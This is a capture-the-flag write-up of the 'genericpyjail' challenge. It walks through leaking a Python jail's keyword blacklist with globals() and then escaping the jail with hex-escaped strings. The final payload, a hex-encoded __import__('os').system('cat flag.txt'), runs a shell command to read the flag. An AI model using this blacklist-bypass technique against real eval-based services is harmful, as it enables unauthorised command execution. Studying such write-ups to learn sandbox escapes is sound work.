# Generic Pyjail - Misc

### [~$ cd ..](../)

>genericpyjail
>
>Written by: dns
>
>When has a blacklist of insecure keywords EVER failed?
>
>nc chall2.2019.redpwn.net 6006

I really love python and Pyjail!

We were given the list of blacklisted words, but I actually didn't even notice it! The first thing I did was :

```
wow! there's a file called flag.txt right here!
>>> globals()
Traceback (most recent call last):
  File "jail1.py", line 52, in <module>
    exec(data)
  File "<string>", line 1
    {'no': 'file', '__builtins__': <module '__builtin__' (built-in)>, '__file__': 'jail1.py', '__package__': None, 'banned': ['import', 'ast', 'eval', '=', 'pickle', 'os', 'subprocess', 'i love blacklisting words!', 'input', 'sys', 'windows users', 'print', 'execfile', 'hungrybox', 'builtins', 'open', 'most of these are in here just to confuse you', '_', 'dict', '[', '>', '<', ':', ';', ']', 'exec', 'hah almost forgot that one', 'for', '@dir', 'yah have fun', 'file'], '__name__': '__main__', 'data': {...}, '__doc__': None, 'print_function': _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0), 65536)}
                                   ^
SyntaxError: invalid syntax
```

and I then knew which words were prohibited!

Trying some basic inputs gave some valuable hints about what was going on:

```
wow! there's a file called flag.txt right here!
>>> test
Traceback (most recent call last):
  File "jail1.py", line 49, in <module>
    data = eval(data)
  File "<string>", line 1, in <module>
NameError: name 'test' is not defined
```

We then had to feed `eval` with non-blacklisted words, such as escaped sequences (`import` was normally prohibited):

```
wow! there's a file called flag.txt right here!
>>> '\x69\x6d\x70\x6f\x72\x74'
Traceback (most recent call last):
  File "jail1.py", line 52, in <module>
    exec(data)
  File "<string>", line 1
    import
         ^
SyntaxError: invalid syntax
```

The attack was then trivial. We only had to encode `__import__('os').system('cat flag.txt')` and get our reward:

```
wow! there's a file called flag.txt right here!
>>> '\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29'
flag{bl4ckl1sts_w0rk_gre3344T!}
```

FLAG: **flag{bl4ckl1sts_w0rk_gre3344T!}**

EOF
